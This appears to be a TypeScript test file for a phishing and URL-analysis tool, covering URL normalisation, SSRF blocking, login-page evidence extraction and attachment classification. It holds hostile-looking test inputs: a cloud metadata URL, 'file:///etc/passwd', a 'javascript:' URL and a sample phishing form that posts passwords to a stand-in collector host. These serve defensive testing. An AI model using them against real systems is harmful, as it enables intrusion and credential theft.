import { test } from 'node:test';
import assert from 'node:assert/strict';
import { normalizeUrl, structureSignals, analyzeUrl } from '../urlIntel';
import { isPrivateAddress, validateTarget, BlockedTargetError } from '../safeFetch';
import { extractEvidence } from '../siteInspect';
import { classifyFile } from '../attachmentIntel';

test('URL normalisation: defanged, case, default port, fragment, IDN', () => {
    const n = normalizeUrl('hxxps://Login.Example[.]com:443/Path?a=1#frag');
    assert.equal(n?.url, 'https://login.example.com/Path?a=1');
    assert.equal(n?.host, 'login.example.com');
    assert.equal(n?.domain, 'example.com');
    assert.equal(normalizeUrl('example.com/x')?.url, 'http://example.com/x');
    assert.equal(normalizeUrl('https://bücher.de/')?.host, 'xn--bcher-kva.de');
    assert.equal(normalizeUrl('javascript:alert(1)'), null);
    assert.equal(normalizeUrl('ftp://x.com/'), null);
});

test('URL structure signals', () => {
    const ids = (u: string) => structureSignals(normalizeUrl(u)!, u).map((s) => s.id);
    assert.ok(ids('http://192.0.2.1/login').includes('ip_host'));
    assert.ok(ids('http://paypal.com@evil.example/').includes('userinfo'));
    assert.ok(ids('https://bit.ly/abc').includes('shortener'));
    assert.ok(ids('https://xn--pypal-4ve.com/').includes('punycode'));
    assert.ok(ids('https://site.example/account/verify').includes('credential_path'));
    assert.deepEqual(ids('https://www.example.com/'), []);
});

test('SSRF: private, loopback, link-local, CGNAT, multicast and mapped addresses are refused', () => {
    for (const ip of ['127.0.0.1', '10.1.2.3', '172.16.0.1', '192.168.1.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '224.0.0.1', '::1', 'fc00::1', 'fe80::1', '::ffff:127.0.0.1', '::ffff:10.0.0.1']) {
        assert.equal(isPrivateAddress(ip), true, ip);
    }
    for (const ip of ['8.8.8.8', '1.1.1.1', '2606:4700:4700::1111']) assert.equal(isPrivateAddress(ip), false, ip);
});

test('SSRF: scheme, port, credentials and internal names are refused before any request', async () => {
    const blocked = async (u: string) => assert.rejects(validateTarget(u), BlockedTargetError, u);
    await blocked('file:///etc/passwd');
    await blocked('gopher://example.com/');
    await blocked('http://example.com:8080/');
    await blocked('https://user:pass@example.com/');
    await blocked('http://localhost/');
    await blocked('http://metadata.internal/');
    await blocked('http://127.0.0.1/');
    await blocked('http://[::1]/');
    await blocked('http://169.254.169.254/latest/meta-data/');
});

test('website evidence: login form posting off-site, brand mention, no execution', () => {
    const html = `<html><head><title>Company Secure Sign In</title><meta name="description" content="Company portal"></head>
      <body><form action="https://collector.example/p.php" method="post"><input type="email" name="u"><input type="password" name="p"><input type="hidden" name="t"></form>
      <script src="https://cdn.other.example/x.js"></script><iframe src="about:blank"></iframe><p>Please verify your account</p></body></html>`;
    const e = extractEvidence(html, 'https://company-login.example/', ['company']);
    assert.equal(e.title, 'Company Secure Sign In');
    assert.equal(e.forms.length, 1);
    assert.equal(e.forms[0].external, true);
    assert.equal(e.forms[0].password_fields, 1);
    assert.ok(e.login_indicators.includes('password field'));
    assert.ok(e.login_indicators.includes('verify your account'));
    assert.deepEqual(e.brand_mentions, ['company']);
    assert.equal(e.external_scripts, 1);
    assert.equal(e.iframes, 1);
});

test('attachment classification from metadata only', () => {
    assert.equal(classifyFile('invoice.pdf.exe').file_class, 'executable');
    assert.match(classifyFile('invoice.pdf.exe').signals.join(), /Double extension/);
    assert.equal(classifyFile('report.docm').file_class, 'macro_document');
    assert.equal(classifyFile('payload.iso').file_class, 'container');
    assert.equal(classifyFile('login.html').file_class, 'html');
    assert.equal(classifyFile('notes.pdf').file_class, 'document');
    assert.equal(classifyFile(null).file_class, 'unknown');
});

test('internal URLs are never sent to external intelligence feeds or fetched', async () => {
    const realFetch = globalThis.fetch;
    let calls = 0;
    globalThis.fetch = (async () => { calls++; return new Response('{}'); }) as typeof fetch;
    try {
        for (const u of ['http://169.254.169.254/latest/meta-data/', 'http://10.1.2.3/admin', 'http://intranet.local/', 'http://[::1]/']) {
            const a = await analyzeUrl(u, { fetch: true });
            assert.equal(a.verdict, 'invalid', u);
            assert.equal(a.fetch, null, u);
        }
        assert.equal(calls, 0);
    } finally { globalThis.fetch = realFetch; }
});
